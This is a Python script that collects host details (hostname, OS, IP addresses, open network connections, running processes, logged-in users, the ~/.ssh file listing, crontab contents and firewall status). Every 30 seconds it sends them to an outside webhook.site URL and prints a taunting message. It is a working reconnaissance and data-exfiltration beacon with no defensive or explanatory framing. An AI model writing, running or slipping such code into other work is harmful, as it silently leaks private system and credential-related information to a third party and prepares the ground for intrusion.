import platform, psutil, requests, time, socket, os, json, subprocess
SERVER = "https://webhook.site/bc6a33cc-de1e-4d23-a069-20b1fc36818e"
def get_local_ips():
    out = {}
    for iface, addrs in psutil.net_if_addrs().items():
        out[iface] = []
        for a in addrs:
            if a.address:
                out[iface].append({"family": str(a.family), "address": a.address, "netmask": a.netmask, "broadcast": a.broadcast})
    return out
def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        return r.json().get("ip")
    except:
        try:
            r = requests.get("https://ifconfig.co/json", timeout=5)
            return r.json().get("ip")
        except:
            return None
def get_net_connections():
    conns = psutil.net_connections(kind='inet')
    listening = []
    established = []
    for c in conns:
        laddr = f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else ""
        raddr = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else ""
        entry = {"pid": c.pid, "type": str(c.type), "status": c.status, "laddr": laddr, "raddr": raddr}
        if c.status == "LISTEN":
            listening.append(entry)
        elif c.status in ("ESTABLISHED","SYN_SENT","SYN_RECV"):
            established.append(entry)
    return {"listening": listening, "established": established}
def top_processes(n=10):
    procs = []
    for p in psutil.process_iter(attrs=["pid","name","username","cpu_percent","memory_percent"]):
        info = p.info
        procs.append(info)
    procs.sort(key=lambda x: (x.get("cpu_percent") or 0, x.get("memory_percent") or 0), reverse=True)
    return procs[:n]
def get_users():
    try:
        us = psutil.users()
        return [{"name": u.name, "host": u.host, "started": u.started} for u in us]
    except:
        return []
def ssh_info():
    home = os.path.expanduser("~")
    sshdir = os.path.join(home, ".ssh")
    if not os.path.exists(sshdir):
        return {"exists": False}
    files = []
    for fn in os.listdir(sshdir):
        path = os.path.join(sshdir, fn)
        try:
            st = os.stat(path)
            files.append({"name": fn, "size": st.st_size, "mode": oct(st.st_mode)[-3]})
        except:
            files.append({"name": fn, "size": None})
    return {"exists": True, "files": files}
def cron_info():
    cron_data = []
    try:
        if platform.system().lower()=="linux":
            try:
                with open("/etc/crontab","r") as f:
                    cron_data.append({"source":"/etc/crontab","content":f.read()})
            except:
                pass
            try:
                out = subprocess.check_output(["crontab","-l"], stderr=subprocess.STDOUT, timeout=3).decode(errors="ignore")
                cron_data.append({"source":"user_crontab","content":out})
            except:
                pass
        elif platform.system().lower()=="darwin":
            try:
                out = subprocess.check_output(["crontab","-l"], stderr=subprocess.STDOUT, timeout=3).decode(errors="ignore")
                cron_data.append({"source":"user_crontab","content":out})
            except:
                pass
    except:
        pass
    return cron_data
def firewall_status():
    try:
        sys = platform.system().lower()
        if sys=="linux":
            try:
                out = subprocess.check_output(["ufw","status"], stderr=subprocess.STDOUT, timeout=3).decode(errors="ignore")
                return out.strip()
            except:
                return None
        if sys=="windows":
            try:
                out = subprocess.check_output(["netsh","advfirewall","show","allprofiles"], stderr=subprocess.STDOUT, timeout=5).decode(errors="ignore")
                return out.strip()
            except:
                return None
    except:
        return None
def get_basic():
    return {
        "hostname": platform.node(),
        "fqdn": socket.getfqdn(),
        "system": platform.system(),
        "platform": platform.platform(),
        "os_version": platform.version(),
        "python_version": platform.python_version(),
        "cpu_usage": psutil.cpu_percent(interval=1),
        "cpu_cores": psutil.cpu_count(logical=True),
        "memory_usage": psutil.virtual_memory().percent,
        "total_memory": psutil.virtual_memory().total,
        "disk_usage": psutil.disk_usage('/').percent if os.path.exists('/') else None,
        "uptime_sec": int(time.time() - psutil.boot_time())
    }
while True:
    payload = get_basic()
    payload["local_ips"] = get_local_ips()
    payload["public_ip"] = get_public_ip()
    payload["net_connections"] = get_net_connections()
    payload["top_processes"] = top_processes(15)
    payload["users"] = get_users()
    payload["ssh"] = ssh_info()
    payload["cron"] = cron_info()
    payload["firewall"] = firewall_status()
    try:
        requests.post(SERVER, json=payload, timeout=10)
        print("Gaya abb toh tu!")
    except Exception as e:
        print("Error:", e)
    time.sleep(30)
